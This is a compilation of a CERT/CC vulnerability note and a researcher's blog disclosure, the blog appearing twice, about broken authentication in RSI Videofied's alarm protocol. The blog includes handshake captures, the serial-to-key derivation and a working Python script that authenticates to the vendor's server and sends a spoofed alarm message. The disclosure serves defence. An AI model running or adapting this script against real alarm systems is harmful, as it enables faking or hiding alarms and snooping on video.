=== Content from www.kb.cert.org_0198ded0_20250125_214724.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#792004

## RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol

#### Vulnerability Note VU#792004

Original Release Date: 2015-11-30 | Last Revised: 2015-11-30

---

### Overview

RSI Video Technologies' Videofied security system uses a software named Frontel to monitor alarm status. Frontel uses an insecure custom protocol to communicate with its Frontel server.

### Description

| Frontel uses a custom protocol running on TCP port 888. The protocol performs an authentication handshake using AES-128 and a pre-shared key, and then sends data.  [**CWE-321**](http://cwe.mitre.org/data/definitions/321.html)**: Use of Hard-coded Cryptographic Key -** CVE-2015-8252The authentication protocol uses a pre-shared key that entirely derived from the serial number of the device. This serial number is transmitted in the plain in messages, allowing an attacker to determine the key.[**CWE-311**](http://cwe.mitre.org/data/definitions/311.html)**: Missing Encryption of Sensitive Data** - CVE-2015-8253Messages and videos are sent unencrypted after the AES authentication handshake. The messages are sent in plain text, and the videos are sent as MJPEG video.[**CWE-345**](http://cwe.mitre.org/data/definitions/345.html)**: Insufficient Verification of Data Authenticity** - CVE-2015-8254Messages are sent without any integrity protection of the data. Messages may be spoofed to, for example, send false alarm signals or deactivate alarms.For more information, please see the researcher's [blog post](http://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/). |
| --- |

### Impact

| A remote unauthenticated attacker may be able to spoof messages to manipulate and snoop on data, including video. |
| --- |

### Solution

| **Apply an update**RSI Video Technologies has released an update to Frontel that introduces Frontel protocol version 3 to address these issues. Affected users should receive the update over the next month (by end of December 2015). Affected users are encouraged to update as soon as possible, and to contact RSI with any questions or concerns. |
| --- |

### Vendor Information

792004
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23792004/) to view vendors.**
### [RSI Video Technologies](#BLUU-9Z64MY) Affected

Notified:  August 07, 2015  Updated: November 30, 2015

**Statement Date:   November 05, 2015**

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 9.4 | AV:N/AC:L/Au:N/C:C/I:C/A:N |
| Temporal | 7.4 | E:POC/RL:OF/RC:C |
| Environmental | 5.5 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <http://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/>
* <http://cwe.mitre.org/data/definitions/321.html>
* <http://cwe.mitre.org/data/definitions/311.html>
* <http://cwe.mitre.org/data/definitions/345.html>
### Acknowledgements

Thanks to Andrew Tierney for reporting this vulnerability.

This document was written by Garret Wassermann.

### Other Information

| **CVE IDs:** | [CVE-2015-8252](http://web.nvd.nist.gov/vuln/detail/CVE-2015-8252%20) , [CVE-2015-8253](http://web.nvd.nist.gov/vuln/detail/CVE-2015-8253), [CVE-2015-8254](http://web.nvd.nist.gov/vuln/detail/CVE-2015-8254) |
| --- | --- |
| **Date Public:** | 2015-11-30 |
| **Date First Published:** | 2015-11-30 |
| **Date Last Updated:** | 2015-11-30 16:45 UTC |
| **Document Revision:** | 48 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from cybergibbons.com_74d9992e_20250126_121439.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.



=== Content from cybergibbons.com_950878a8_20250126_121440.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

